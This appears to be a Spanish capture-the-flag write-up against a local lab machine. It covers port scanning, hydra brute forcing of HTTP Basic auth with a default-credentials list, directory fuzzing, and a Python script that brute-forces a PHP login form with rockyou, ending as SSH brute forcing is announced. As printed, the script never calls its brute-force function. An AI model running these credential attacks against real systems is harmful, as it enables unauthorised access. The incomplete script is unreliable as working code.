## FASE DE ENUMERACIÓN
Sabiendo que la IP de la máquina víctima es:
```bash
172.17.0.2
```
lanzamos un scaneo con nmap para ver que puertos tiene abiertos, que servicios corren por ellos y sus versiones por si son vulnerables:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOiDMcTZdMv54RYo66Vj1lo0DHXGzARy5cb26KgkubJZrBqOpV/mZ377CY8BcTi2CLeR0saiWSVFKfbttcqqI9s=
|   256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfU3b71so+RowXPc325dWRWr510sPJQeMOdG+i3QEiC
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
|_http-title: 401 Unauthorized
```

Vemos dos puertos abiertos:

  -Puerto 22 dónde corre SSH en versión no vulnerable y sin tener credenciales no podemos hacer nada
  -Puerto 80 HTTP

Nos vamos a centrar en el puerfto 80, lanzamos un whatweb para ver si nos reporta algo interesante:
```bash
whatweb http://172.17.0.2 -v
```
```
WhatWeb report for http://172.17.0.2
Status    : 401 Unauthorized
Title     : 401 Unauthorized
IP        : 172.17.0.2
Country   : RESERVED, ZZ

Summary   : Apache[2.4.62], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], WWW-Authenticate[Zona restringida][Basic]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.62 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.62 (Debian) (from server string)

[ WWW-Authenticate ]
        This plugin identifies the WWW-Authenticate HTTP header and 
        extracts the authentication method and realm. 

        Module       : Basic
        String       : Zona restringida

HTTP Headers:
        HTTP/1.1 401 Unauthorized
        Date: Thu, 03 Jul 2025 19:46:41 GMT
        Server: Apache/2.4.62 (Debian)
        WWW-Authenticate: Basic realm="Zona restringida"
        Content-Length: 457
        Connection: close
        Content-Type: text/html; charset=iso-8859-1
```

Vemos que corre un apache versión 2.4.62 no vulnerable, pero en las cabeceras vemos un 401 y un WWW-Authenticate: Basic realm="Zona restringida", probablemente se trate de un panel de autentificación, vamos a la página web
y efectivamente, mirando el código fuente (Ctrl+u) vemos:
```
 <tt>/var/www/bypass403.pw/index.php</tt>) before continuing to operate your HTTP server.
```

así que por si hay virtualhosting metemos el dominio bypass403.pw en el /etc/hosts

```
sudo nano /etc/hosts
```
y añadimos al final esta linea:
```
172.17.0.2      bypass403.pw
```
ctrl+o para guardar y ctrl+x para salir

Ahora vamos a ver como se tramita la petición de autentificación, abrimos el burpsuite y capturamos una petición, vemos que la petición es la siguiente:
```
GET / HTTP/1.1

Host: 172.17.0.2

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Upgrade-Insecure-Requests: 1

If-Modified-Since: Tue, 10 Jun 2025 09:32:35 GMT

If-None-Match: "29be-63734606012c0-gzip"

Priority: u=0, i

Authorization: Basic ZmRnZGZnOmRmZ2RzZ2Y=
```

lo que me llama la atenciñon es :
```
Authorization: Basic ZmRnZGZnOmRmZ2RzZ2Y=
```
parece un base64, lo decodeo:

```bash
echo "ZmRnZGZnOmRmZ2RzZ2Y=" | base64 -d;echo                                                                                                                                                             
```
```
fdgdfg:dfgdsgf
```

causlamente el user y el password que introduje.

En este punto me planteo como se tramita mi petición por detrás, está claro que se manda un user y un pass, y algo por detrás los une con dos puntos en medio y lo encode a base64, este hash se 
comparará con la autentficación válida y si es correcta accederemos a algún sitio. Hay una opción con hydra que es "-C" que se utiliza para combinar usuario y contraseña, que en nuestro caso
es "usuario:contraseña" en SecList hay un diccionario concretamente /SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt que contiene esas combinaciones, asíque vamos autilizarlo:
```bash
hydra -C RUTA_AL_DICCIONARIO/ftp-betterdefaultpasslist.txt http-get://172.17.0.2/
```
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-03 16:41:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-03 16:41:27
```
Tenemos user y pass:
```
httpadmin:fhttpadmin
```

nos logueamos en la página y nos lleva a un index.html sin nada raro, ahora toca fuzzin con las credenciales:

```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip -U httpadmin -P fhttpadmin
```
```
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]

```

nos vamos a login.php, y vemos otro panel de autentificación...vamos a realizar un ataque de fuerzabruta. capturamos la peticion:
```
POST /login.php HTTP/1.1

Host: 172.17.0.2

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 32

Origin: http://172.17.0.2

Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=

Connection: keep-alive

Referer: http://172.17.0.2/login.php

Upgrade-Insecure-Requests: 1

Priority: u=0, i



username=admin&password=password
```

vemos "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" esta cabecera la utiliza para estar autenticados como "httpadmin:fhttpadmin"
así pues vamos a hacer un pequeño ataque.

creo un script en python:
```bash
import requests
import sys
import os

url = "http://bypass403.pw/login.php"
headers = {
    "Authorization": "Basic aHR0cGFkbWluOmZodHRwYWRtaW4=",
    "Content-Type": "application/x-www-form-urlencoded"
}

def load_words(filepath):
    if not os.path.isfile(filepath):
        print(f"❌ Archivo no encontrado: {filepath}")
        sys.exit(1)
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def brute_force(userlist, passlist):
    for user in userlist:
        for password in passlist:
            data = {
                "username": user,
                "password": password
            }
            try:
                response = requests.post(url, headers=headers, data=data, timeout=10)
                if "Credenciales incorrectas" not in response.text:
                    print(f"\n✅ ¡Credenciales válidas encontradas! -> Usuario: {user} | Contraseña: {password}")
                    return
                else:
                    print(f"❌ {user}:{password}")
            except requests.exceptions.RequestException as e:
                print(f"⚠ Error con {user}:{password} -> {e}")

    print("\n🚫 No se encontraron credenciales válidas.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python script.py /ruta/usuarios.txt /ruta/passwords.txt")
        sys.exit(1)

    users_file = sys.argv[1]
    passwords_file = sys.argv[2]

    users = load_words(users_file)
    passwords = load_words(passwords_file)
```
lo uso de esta manera:
```
python script.py RUTA_DICCIONARIO_USUARIOS/users.txt /usr/share/wordlists/rockyou.txt
```
En el diccionario de usuarios solo metí admin mario y guest, lo ejecuto:

```
❌ admin:123456
❌ admin:12345
❌ admin:123456789
❌ admin:password
❌ admin:iloveyou
❌ admin:princess
❌ admin:1234567
❌ admin:rockyou
❌ admin:12345678
❌ admin:abc123
❌ admin:nicole
❌ admin:daniel
❌ admin:babygirl
❌ admin:monkey
❌ admin:lovely
❌ admin:jessica
❌ admin:654321
❌ admin:michael
❌ admin:ashley
❌ admin:qwerty
❌ admin:111111
❌ admin:iloveu
❌ admin:000000
❌ admin:michelle
❌ admin:tigger
❌ admin:sunshine

✅ ¡Credenciales válidas encontradas! -> Usuario: admin | Contraseña: chocolate
```
pues vamos a loguearnos como admin:chocolate

y tacan!!!
otro user:

```
¡Login correcto! Enhorabuena! De parte del usuario balutin, te damos la enhorabuena
```
balutin...ahora toca fuerzabruta por SSH:


